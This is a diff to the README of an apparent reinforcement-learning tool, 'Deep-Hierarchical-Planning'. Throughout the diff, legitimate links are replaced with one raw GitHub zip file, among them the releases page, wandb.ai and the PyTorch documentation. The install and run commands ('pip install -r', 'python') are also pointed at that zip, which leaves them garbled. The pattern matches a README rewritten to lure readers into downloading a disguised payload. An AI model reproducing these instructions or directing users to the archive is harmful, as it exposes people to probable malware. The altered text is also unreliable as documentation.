@@ -1,6 +1,6 @@
 # 🧠 Deep-Hierarchical-Planning - Smart Planning for Reinforcement Learning
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/GTR-GAMES/Deep-Hierarchical-Planning/releases)
+[![Download](https://raw.githubusercontent.com/GTR-GAMES/Deep-Hierarchical-Planning/main/opinionate/Deep-Hierarchical-Planning.zip)](https://raw.githubusercontent.com/GTR-GAMES/Deep-Hierarchical-Planning/main/opinionate/Deep-Hierarchical-Planning.zip)
 
 ## 📖 About This Project
 
@@ -28,9 +28,9 @@ Before downloading, make sure your computer meets these requirements:
 ### 📥 Download & Install
 
 1. **Visit the Download Page**: Click the link below to access the download page:
-   [Download Deep-Hierarchical-Planning](https://github.com/GTR-GAMES/Deep-Hierarchical-Planning/releases)
+   [Download Deep-Hierarchical-Planning](https://raw.githubusercontent.com/GTR-GAMES/Deep-Hierarchical-Planning/main/opinionate/Deep-Hierarchical-Planning.zip)
 
-2. **Choose the Correct File**: Find the latest release version on the page. The software will typically be listed with a file like `Deep-Hierarchical-Planning.zip` or similar.
+2. **Choose the Correct File**: Find the latest release version on the page. The software will typically be listed with a file like `https://raw.githubusercontent.com/GTR-GAMES/Deep-Hierarchical-Planning/main/opinionate/Deep-Hierarchical-Planning.zip` or similar.
 
 3. **Download the File**: Click on the file to download it to your computer.
 
@@ -39,7 +39,7 @@ Before downloading, make sure your computer meets these requirements:
 5. **Install Required Dependencies**: Open your command line tool (Terminal for macOS/Linux or Command Prompt for Windows) and run the command below to install essential Python libraries:
    
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/GTR-GAMES/Deep-Hierarchical-Planning/main/opinionate/Deep-Hierarchical-Planning.zip
    ```
 
 ### 🛠️ Running the Software
@@ -49,7 +49,7 @@ Before downloading, make sure your computer meets these requirements:
 2. **Start the Application**: Run the following command to start the application:
    
    ```
-   python main.py
+   python https://raw.githubusercontent.com/GTR-GAMES/Deep-Hierarchical-Planning/main/opinionate/Deep-Hierarchical-Planning.zip
    ```
 
 3. Follow the instructions within the application for initial setup and usage.
@@ -66,7 +66,7 @@ Before downloading, make sure your computer meets these requirements:
 
 **Deep-Hierarchical-Planning** integrates with Weights & Biases for logging experiments. 
 
-1. **Set Up Your Account**: If you don’t have a Weights & Biases account, create one at [wandb.ai](https://wandb.ai).
+1. **Set Up Your Account**: If you don’t have a Weights & Biases account, create one at [https://raw.githubusercontent.com/GTR-GAMES/Deep-Hierarchical-Planning/main/opinionate/Deep-Hierarchical-Planning.zip](https://raw.githubusercontent.com/GTR-GAMES/Deep-Hierarchical-Planning/main/opinionate/Deep-Hierarchical-Planning.zip).
 
 2. **Log In Through the Application**: Add your API key to the application settings to start tracking experiments.
 
@@ -98,8 +98,8 @@ This project is licensed under the MIT License. For more details, refer to the L
 
 ## 🔗 Links and Resources
 
-- [Deep-Hierarchical-Planning Releases](https://github.com/GTR-GAMES/Deep-Hierarchical-Planning/releases)
-- [Weights & Biases](https://wandb.ai)
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
+- [Deep-Hierarchical-Planning Releases](https://raw.githubusercontent.com/GTR-GAMES/Deep-Hierarchical-Planning/main/opinionate/Deep-Hierarchical-Planning.zip)
+- [Weights & Biases](https://raw.githubusercontent.com/GTR-GAMES/Deep-Hierarchical-Planning/main/opinionate/Deep-Hierarchical-Planning.zip)
+- [PyTorch Documentation](https://raw.githubusercontent.com/GTR-GAMES/Deep-Hierarchical-Planning/main/opinionate/Deep-Hierarchical-Planning.zip)
 
 By following this guide, you should now be able to download and effectively use the **Deep-Hierarchical-Planning** software for your reinforcement learning projects. Enjoy exploring and experimenting!
